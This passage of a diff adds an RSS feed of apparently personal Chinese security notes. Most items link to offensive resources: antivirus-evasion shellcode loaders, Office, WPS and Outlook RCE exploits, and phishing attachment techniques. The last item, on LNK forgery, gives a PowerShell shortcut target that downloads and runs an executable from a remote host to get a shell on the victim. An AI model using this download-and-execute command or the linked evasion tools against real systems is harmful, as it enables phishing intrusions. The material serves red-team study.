noreferrer">Go命令执行 - Google Search</a></li>
+<li><a href="https://bbs.huaweicloud.com/blogs/355158" target="_blank" rel="noopener noreferrer">Go 语言入门很简单：Go 语言执行Shell命令-云社区-华为云 (huaweicloud.com)</a></li>
+<li><a href="https://darjun.github.io/2022/11/01/godailylib/osexec/" target="_blank" rel="noopener noreferrer">Go中调用外部命令的几种姿势 - 大俊的博客 (darjun.github.io)</a></li>
+<li><a href="https://www.yangyanxing.com/article/exec_command_in_go.html" target="_blank" rel="noopener noreferrer">go语言中执行命令的几种方式 - 序语程言 (yangyanxing.com)</a></li>
+<li><a href="https://colobu.com/2020/12/27/go-with-os-exec/" target="_blank" rel="noopener noreferrer">go os/exec 简明教程 (colobu.com)</a></li>
+<li><a href="https://www.cnblogs.com/wongbingming/p/13984538.html" target="_blank" rel="noopener noreferrer">Go语言中用 os/exec 执行命令的五种姿势 - 王一白 - 博客园 (cnblogs.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>溯源反制</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%93%9D%E9%98%9F/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%93%9D%E9%98%9F/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">溯源反制</source>
+      <description>溯源反制
+
+溯源反制-自搭建蜜罐到反制攻击队 - 知乎 (zhihu.com)</description>
+      <pubDate>Fri, 28 Jun 2024 09:11:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/656856056" target="_blank" rel="noopener noreferrer">溯源反制-自搭建蜜罐到反制攻击队 - 知乎 (zhihu.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>免杀</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E5%85%8D%E6%9D%80/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E5%85%8D%E6%9D%80/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">免杀</source>
+      <description>免杀
+
+
+RedTeamNotes/go免杀的一些思路.pdf at main · biggerduck/RedTeamNotes · GitHub
+
+
+Shellcode
+
+GitHub - wangfly-me/SysHttpHookSleep: 集合多种方式的ShellcodeLoader
+GitHub - Pizz33/GobypassAV-s...</description>
+      <pubDate>Fri, 28 Jun 2024 09:11:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li>
+<p><a href="https://github.com/biggerduck/RedTeamNotes/blob/main/go%E5%85%8D%E6%9D%80%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF.pdf" target="_blank" rel="noopener noreferrer">RedTeamNotes/go免杀的一些思路.pdf at main · biggerduck/RedTeamNotes · GitHub</a></p>
+</li>
+<li>
+<p>Shellcode</p>
+<ul>
+<li><a href="https://github.com/wangfly-me/SysHttpHookSleep" target="_blank" rel="noopener noreferrer">GitHub - wangfly-me/SysHttpHookSleep: 集合多种方式的ShellcodeLoader</a></li>
+<li><a href="https://github.com/Pizz33/GobypassAV-shellcode" target="_blank" rel="noopener noreferrer">GitHub - Pizz33/GobypassAV-shellcode: shellcode免杀加载器，使用go实现，免杀bypass火绒、360、核晶、def等主流杀软</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Exchange</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/Exchange.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/Exchange.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Exchange</source>
+      <description>Exchange
+
+渗透测试中的Exchange - 知乎 (zhihu.com)</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/339329927" target="_blank" rel="noopener noreferrer">渗透测试中的Exchange - 知乎 (zhihu.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Outlook</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/Outlook.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/Outlook.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Outlook</source>
+      <description>Outlook
+
+GitHub - xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability: Microsoft-Outlook-Remote-Code-Execution-Vulnerability</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability" target="_blank" rel="noopener noreferrer">GitHub - xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability: Microsoft-Outlook-Remote-Code-Execution-Vulnerability</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>钓鱼演练</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">钓鱼演练</source>
+      <description>钓鱼演练</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CSV</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/CSV/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/CSV/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CSV</source>
+      <description>CSV
+
+office-exploits/injections at master · SecWiki/office-exploits · GitHub
+CSV注入详解 - 先知社区 (aliyun.com)
+
+
+CSV简介
+CSV(Comma-Separated Values) 是一种用来存储数据的纯文本格式文件。
+CSV文件由任意数目的记录组成，记...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/SecWiki/office-exploits/tree/master/injections" target="_blank" rel="noopener noreferrer">office-exploits/injections at master · SecWiki/office-exploits · GitHub</a></p>
+<p><a href="https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0" target="_blank" rel="noopener noreferrer">CSV注入详解 - 先知社区 (aliyun.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407100946680.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2017-8759_WSDL解析器代码注入</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8759_WSDL%E8%A7%A3%E6%9E%90%E5%99%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8759_WSDL%E8%A7%A3%E6%9E%90%E5%99%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-8759_WSDL解析器代码注入</source>
+      <description>CVE-2017-8759_WSDL解析器代码注入
+CVE-2017-8759复现 - Google Search
+
+office-exploits/CVE-2017-8759/readme.md at master · SecWiki/office-exploits · GitHub
+微软.NET Framework cve-2017-8759 复现...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p><a href="https://www.google.com/search?q=CVE-2017-8759%E5%A4%8D%E7%8E%B0&amp;sca_esv=b0587616288d9197&amp;sxsrf=ADLYWILFWCEXUpWsqpvfJMduCpCAqb4hYA%3A1719560887092&amp;source=hp&amp;ei=t2p-ZoK3A5Pn2roPs5KCmA8&amp;iflsig=AL9hbdgAAAAAZn54x9S2PAc0KTbbBuamxRIYc6GTquQL&amp;ved=0ahUKEwjC7t6-5_2GAxWTs1YBHTOJAPMQ4dUDCBY&amp;uact=5&amp;oq=CVE-2017-8759%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egdnd3Mtd2l6IhNDVkUtMjAxNy04NzU55aSN546wSNdAUMQGWJw_cAV4AJABAJgB0AGgAYMXqgEGMC4yMS4xuAEDyAEA-AEBmAISoALqDagCCsICBxAjGCcY6gLCAgQQIxgnwgILEAAYgAQYkQIYigXCAgoQABiABBhDGIoFwgIIEAAYgAQYsQPCAhEQLhiABBixAxjRAxiDARjHAcICEBAuGIAEGNEDGEMYxwEYigXCAgUQABiABMICBBAAGB7CAgYQABgFGB7CAgYQABgIGB7CAggQABiABBjLAcICCBAAGIAEGKIEmAMLkgcENS4xM6AHzm0&amp;sclient=gws-wiz#ip=1" target="_blank" rel="noopener noreferrer">CVE-2017-8759复现 - Google Search</a></p>
+<ul>
+<li><a href="https://github.com/SecWiki/office-exploits/blob/master/CVE-2017-8759/readme.md" target="_blank" rel="noopener noreferrer">office-exploits/CVE-2017-8759/readme.md at master · SecWiki/office-exploits · GitHub</a></li>
+<li><a href="https://www.cnblogs.com/backlion/p/7550902.html" target="_blank" rel="noopener noreferrer">微软.NET Framework cve-2017-8759 复现 - 渗透测试中心 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://exp10it.io/2019/08/office-cve-2017-8759-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener noreferrer">Office CVE-2017-8759 复现 - X1r0z Blog (exp10it.io)</a></li>
+<li><a href="https://blog.csdn.net/qq_36360189/article/details/87920367" target="_blank" rel="noopener noreferrer">.NET Framework漏洞(CVE-2017-8759)复现及后续渗透-CSDN博客</a></li>
+<li><a href="https://fuping.site/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/" target="_blank" rel="noopener noreferrer">.NET框架0Day漏洞CVE-2017-8759复现过程 · 浮萍's Blog (fuping.site)</a></li>
+<li><a href="https://xz.aliyun.com/t/57?time__1311=n4RxyDn7DQ0QtiKDsdoYKwpDfx7u%2BDjEwiD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener noreferrer">.NET框架0Day漏洞复现过程—【CVE-2017-8759】 - 先知社区 (aliyun.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2021-40444_Microsoft-Office-Word-MSHTML-RCE</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2021-40444_Microsoft-Office-Word-MSHTML-RCE.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2021-40444_Microsoft-Office-Word-MSHTML-RCE.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2021-40444_Microsoft-Office-Word-MSHTML-RCE</source>
+      <description>CVE-2021-40444_Microsoft-Office-Word-MSHTML-RCE
+
+参考链接
+
+利用工具
+
+GitHub - 34zY/Microsoft-Office-Word-MSHTML-Remote-Code-Execution-Exploit: CVE-2021-40444
+GitHub - klezVirus/CVE-2021...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2022-30190_Follina-Office-MSDT-RCE</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2022-30190_Follina-Office-MSDT-RCE.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2022-30190_Follina-Office-MSDT-RCE.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2022-30190_Follina-Office-MSDT-RCE</source>
+      <description>CVE-2022-30190_Follina-Office-MSDT-RCE
+
+GitHub - komomon/CVE-2022-30190-follina-Office-MSDT-Fixed: CVE-2022-30190-follina.py-修改版，可以自定义word模板，方便实战中钓鱼使用。
+GitHub - chvancooten/foll...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed" target="_blank" rel="noopener noreferrer">GitHub - komomon/CVE-2022-30190-follina-Office-MSDT-Fixed: CVE-2022-30190-follina.py-修改版，可以自定义word模板，方便实战中钓鱼使用。</a></li>
+<li><a href="https://github.com/chvancooten/follina.py" target="_blank" rel="noopener noreferrer">GitHub - chvancooten/follina.py: POC to replicate the full 'Follina' Office RCE vulnerability for testing purposes</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2023-21716</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2023-21716.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2023-21716.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2023-21716</source>
+      <description>CVE-2023-21716
+没看到有什么实际 RCE 的复现思路, 都是崩溃
+CVE-2023-21716复现 - Google Search
+
+通告
+
+Microsoft Word远程代码执行漏洞 (CVE-2023-21716) 安全通告 - 安全内参 | 决策者的网络安全知识库 (secrss.com)
+
+
+利用工具
+
+GitHub - Xnu...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p>没看到有什么实际 RCE 的复现思路, 都是崩溃</p>
+<p><a href="https://www.google.com/search?q=+CVE-2023-21716%E5%A4%8D%E7%8E%B0&amp;sca_esv=b0587616288d9197&amp;sxsrf=ADLYWILHpwP_oDl8nvyz02ZYok2pQ7miMQ%3A1719560508814&amp;source=hp&amp;ei=PGl-ZoKCMMKO2roPnvuN-AE&amp;iflsig=AL9hbdgAAAAAZn53TNWQKDWC730fyL9YmPDHWOhhRGWd&amp;ved=0ahUKEwiCkK-K5v2GAxVCh1YBHZ59Ax8Q4dUDCBY&amp;uact=5&amp;oq=+CVE-2023-21716%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egdnd3Mtd2l6IhUgQ1ZFLTIwMjMtMjE3MTblpI3njrAyCBAAGIAEGKIESIENUJoBWLELcAF4AJABAJgB9QGgAagJqgEFMC43LjG4AQPIAQD4AQL4AQGYAgOgAvACqAIKwgIHECMYJxjqAsICCBAAGKIEGIkFmAMOkgcFMS4xLjGgB6sM&amp;sclient=gws-wiz#ip=1" target="_blank" rel="noopener noreferrer">CVE-2023-21716复现 - Google Search</a></p>
+<ul>
+<li>通告
+<ul>
+<li><a href="https://www.secrss.com/articles/52541" target="_blank" rel="noopener noreferrer">Microsoft Word远程代码执行漏洞 (CVE-2023-21716) 安全通告 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</a></li>
+</ul>
+</li>
+<li>利用工具
+<ul>
+<li><a href="https://github.com/Xnuvers007/CVE-2023-21716" target="_blank" rel="noopener noreferrer">GitHub - Xnuvers007/CVE-2023-21716: RTF Crash POC Python 3.11 Windows 10</a></li>
+</ul>
+</li>
+<li>复现
+<ul>
+<li><a href="https://cn-sec.com/archives/1594172.html" target="_blank" rel="noopener noreferrer">已复现 | Microsoft Word 远程代码执行漏洞(CVE-2023-21716) | CN-SEC 中文网</a></li>
+</ul>
+</li>
+<li>分析
+<ul>
+<li><a href="https://bbs.kanxue.com/thread-276473.htm" target="_blank" rel="noopener noreferrer">漏洞分析CVE-2023-21716-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></li>
+<li><a href="https://www.bilibili.com/read/cv22383742/" target="_blank" rel="noopener noreferrer">最新 RTF RCE 漏洞 CVE-2023-21716 分析 - 哔哩哔哩 (bilibili.com)</a></li>
+<li><a href="https://www.anquanke.com/post/id/287370" target="_blank" rel="noopener noreferrer">最新 RTF RCE 漏洞 CVE-2023-21716 分析-安全客 - 安全资讯平台 (anquanke.com)</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2018-4993</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/PDF%E9%98%85%E8%AF%BB%E5%99%A8%E6%BC%8F%E6%B4%9E/CVE-2018-4993.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/PDF%E9%98%85%E8%AF%BB%E5%99%A8%E6%BC%8F%E6%B4%9E/CVE-2018-4993.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2018-4993</source>
+      <description>CVE-2018-4993
+
+Bad-Pdf,使用 Bad-PDF 窃取 Net-NTLM 哈希,下载Bad-Pdf的源码_GitHub_帮酷 --- GitHub - deepzec/Bad-Pdf: Steal Net-NTLM Hash using Bad-PDF
+通过 PDF 文件盗窃 NTLM 凭据 - Check Point Researc...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p>[Bad-Pdf,使用 Bad-PDF 窃取 Net-NTLM 哈希,下载Bad-Pdf的源码_GitHub_帮酷</p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>WPS</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/WPS/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/WPS/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">WPS</source>
+      <description>WPS
+
+WPS Office老旧版本大全_所有历史官方版安装下载_豌豆荚 (wandoujia.com)
+GitHub - ba0gu0/wps-rce: WPS Office RCE On 2023-08-10
+GitHub - b2git/WPS-0DAY-20230809: WPS-Office 1-Click RCE exp 20230809...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://www.wandoujia.com/apps/280841/history" target="_blank" rel="noopener noreferrer">WPS Office老旧版本大全_所有历史官方版安装下载_豌豆荚 (wandoujia.com)</a></li>
+<li><a href="https://github.com/ba0gu0/wps-rce" target="_blank" rel="noopener noreferrer">GitHub - ba0gu0/wps-rce: WPS Office RCE On 2023-08-10</a></li>
+<li><a href="https://github.com/b2git/WPS-0DAY-20230809" target="_blank" rel="noopener noreferrer">GitHub - b2git/WPS-0DAY-20230809: WPS-Office 1-Click RCE exp 202308091546</a></li>
+<li><a href="https://github.com/webraybtl/CVE-2022-24934" target="_blank" rel="noopener noreferrer">GitHub - webraybtl/CVE-2022-24934</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>RTF注入Office模板</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">RTF注入Office模板</source>
+      <description>RTF注入Office模板
+
+Office RTF远程模板注入 - Bl0od - 博客园 (cnblogs.com)
+黑客越来越多地使用RTF模板注入技术进行网络钓鱼攻击 - 哈客部落 (hake.cc)
+【钓鱼从入门到放弃】-RTF文档 (atsud0.me)
+奇安信威胁情报中心 (qianxin.com)
+
+Decodificando fiche...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.cnblogs.com/zUotTe0/p/15659420.html" target="_blank" rel="noopener noreferrer">Office RTF远程模板注入 - Bl0od - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://www.hake.cc/page/article/611.html" target="_blank" rel="noopener noreferrer">黑客越来越多地使用RTF模板注入技术进行网络钓鱼攻击 - 哈客部落 (hake.cc)</a></p>
+<p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-RTF%E6%96%87%E6%A1%A3/#CVE-2017-8570" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-RTF文档 (atsud0.me)</a></p>
+<p><a href="https://ti.qianxin.com/blog/articles/Analysis-of-the-Donot-group's-attack-campaign-using-RTF-template-injection-against-the-neighbourhood/" target="_blank" rel="noopener noreferrer">奇安信威胁情报中心 (qianxin.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406121124421.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2017-8570</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2017-8570.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2017-8570.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-8570</source>
+      <description>CVE-2017-8570
+
+CVE-2017-8570首次公开的野外样本及漏洞分析 - FreeBuf网络安全行业门户
+【钓鱼从入门到放弃】-RTF文档 (atsud0.me)
+GitHub - rxwx/CVE-2017-8570: Proof of Concept exploit for CVE-2017-8570
+erfze/CVE-2017-...</description>
+      <pubDate>Fri, 28 Jun 2024 09:10:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.freebuf.com/vuls/161607.html" target="_blank" rel="noopener noreferrer">CVE-2017-8570首次公开的野外样本及漏洞分析 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-RTF%E6%96%87%E6%A1%A3/#CVE-2017-8570" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-RTF文档 (atsud0.me)</a></p>
+<p><a href="https://github.com/rxwx/CVE-2017-8570" target="_blank" rel="noopener noreferrer">GitHub - rxwx/CVE-2017-8570: Proof of Concept exploit for CVE-2017-8570</a></p>
+<p><a href="https://github.com/erfze/CVE-2017-8570?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">erfze/CVE-2017-8570: CVE-2017-8570 Exp改造及样本分析 (github.com)</a></p>
+<p><a href="https://github.com/SwordSheath/CVE-2017-8570" target="_blank" rel="noopener noreferrer">SwordSheath/CVE-2017-8570: CVE-2017-8570生成脚本(CVE-2017-0199另一种利用方式) (github.com)</a></p>
+</blockquote>
+<p><code>测试环境</code>: Win7 + Office2016</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406131024235.png" type="image/png"/>
+    </item>
+    <item>
+      <title>LNK伪造</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/LNK%E4%BC%AA%E9%80%A0/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/LNK%E4%BC%AA%E9%80%A0/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">LNK伪造</source>
+      <description>LNK伪造
+LNK+Powershell
+
+疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)
+利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
+
+新建一个快捷方式然后修改目标为如下信息:
+image-20240626114316...</description>
+      <pubDate>Wed, 26 Jun 2024 09:13:45 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>LNK+Powershell</h2>
+<blockquote>
+<p><a href="https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA" target="_blank" rel="noopener noreferrer">疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)</a></p>
+<p><a href="https://www.4hou.com/posts/K70x" target="_blank" rel="noopener noreferrer">利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>
+</blockquote>
+<p>新建一个快捷方式然后修改目标为如下信息:</p>
+<div class="language-cmd" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr http://100.1.1.131:8000/download/local/Code.exe -outfile $env:TEMP\Code.exe;start-process $env:TEMP\Code.exe
+</code></pre></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261143196.png" alt="image-20240626114316470"></p>
+<p>当受害者点击该快捷方式后则会调起powershell下载恶意程序并执行上线shell</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261144336.png" alt="image-20240626114445251"></p>
